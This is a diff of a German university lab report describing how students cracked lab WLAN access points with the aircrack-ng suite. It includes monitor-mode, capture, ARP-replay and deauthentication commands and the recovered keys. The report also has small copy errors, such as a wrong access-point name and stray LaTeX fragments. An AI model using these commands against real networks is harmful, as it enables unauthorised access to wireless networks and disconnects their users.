@@ -205,6 +205,7 @@
     		\item Brechen Sie die im IT-Labor eingerichtete WLAN-Verbindung mit der für Sie vorgesehenen SSID (im Praktikum erfragen) mittels Aircrack unter zu Hilfenahme der Datei Password.txt.
     		Beschreiben Sie kurz die einzelnen Schritte ihrer Vorgehensweise.
     			\begin{answer}
+    				\paragraph{AP ITS-WEP Knacken}
     				Wir haben folgende Schritte durchgeführt und die AP 'ITS-WEP' geknackt. Das Passwort ist 
     				\begin{lstlisting}[language=bash]
 ED:98:ED:38:DF:BB:C3:BB:B0:D2:8C:62:B3
@@ -218,9 +219,9 @@ airmon-ng start wlan0
     					\begin{lstlisting}[language=bash]
 airodump-ng wlan0mon --ivs -c {CH} --bssid {target_ssid} -w {file/to/save}
 						\end{lstlisting}
-						\item Die Menge an Netzwerkverkehr(bzw. ARP-Verkehr) kann durch 2 Arten erhöht werden. Entweder durch Abmelden des zulässige Clients oder Versuch einer falschesten Authentifizierung am AP. Wir haben leider keine zulässige Geräte vorhanden, wir müssen auf 2. Weise gehen, also eine Aireplay-attacke durchzufuhren.
+						\item Um Menge an Netzwerkverkehr(bzw. ARP-Verkehr)  durch 2 Arten zu erhöht, haben wir ARP Request replay attack dürchgefürht mit folgende Befehle:
 						\begin{lstlisting}[language=bash]
-aireplay-ng wlan0 --deauth 0 -a {target_mac}
+aireplay-ng -3 -b {target_mac} -h {networkcart_mac} mon0
 						\end{lstlisting}
 						Da normalerweise soll viele Gerate nach einer abmedlung wieder dem AP zu verbinden,
 						und damit können wir genug ARP Requests und ACKs sammeln.
@@ -229,11 +230,38 @@ aireplay-ng wlan0 --deauth 0 -a {target_mac}
 aircrack-ng {.ivs file} -b {target_ssid}[language=bash]
 						\end{lstlisting}
     				\end{enumerate}
+    				\paragraph{AP ITS-Praktikum knacken}
+					Wir haben folgende Schritte durchgeführt und die AP 'ITS-WEP' geknackt. Das Passwort ist 
+					\begin{lstlisting}[language=bash]
+birthday1
+					\end{lstlisting}
+					\begin{enumerate}[label=\alph*.]
+						\item Mit Airmon-ng die Netzwerkkarte zu promiscuous versetzen 
+						\begin{lstlisting}{language=bash}
+airmon-ng start wlan0
+					\end{lstlisting}
+					\item WLAN mit WEP identifizieren und Netzwerkverkehr mitschneiden. 
+					\begin{lstlisting}[language=bash]
+airodump-ng wlan0mon --ivs -c {CH} --bssid {target_ssid} -w {file/to/save}
+					\end{lstlisting}
+					\item Damit wir Handshake-Pakete so schnell wie möglich sammeln können, haben wir Deauthentication Attacks durchgeführt, so wird die Client gezwungen abgemeldet und wieder anmelden lassen. 
+					\begin{lstlisting}[language=bash]
+aireplay-ng wlan0 --deauth 0 -a {target_mac}
+					\end{lstlisting}
+					Da normalerweise soll viele Gerate nach einer abmedlung wieder dem AP zu verbinden,
+					und damit können wir genug ARP Requests und ACKs sammeln.
+					\item Wenn c.a. 1500 Paket gesammelt wurden, können wir schon mit Aircrack-ng das Passwort zu knacken.
+					\begin{lstlisting}
+aircrack-ng {.ivs file} -b {target_ssid}[language=bash]
+					\end{lstlisting}
+\end{enumerate}    				
+    				
     			\end{answer}
     		\item (Optional) Versuchen Sie, da Sie nun den PSK kennen, die Verkehre mittels eines geeigneten Tools (z.B.Wireshark) aufzuzeichnen und zu entschlüsseln.		
     		\item (Optional) Machen Sie sich mit WPS-Pin-Verfahren vertraut. Versuchen Sie die WLAN-Verbindung
     		mittels WPS anzugreifen.
     	\end{exercise}
+    \newpage
 	\section{Anhang}
 	\subsection{RC4 Algorithm}
 	\lstinputlisting[language=Python]{../Code/de/aug/Uebung1/rc4/rc4.py}
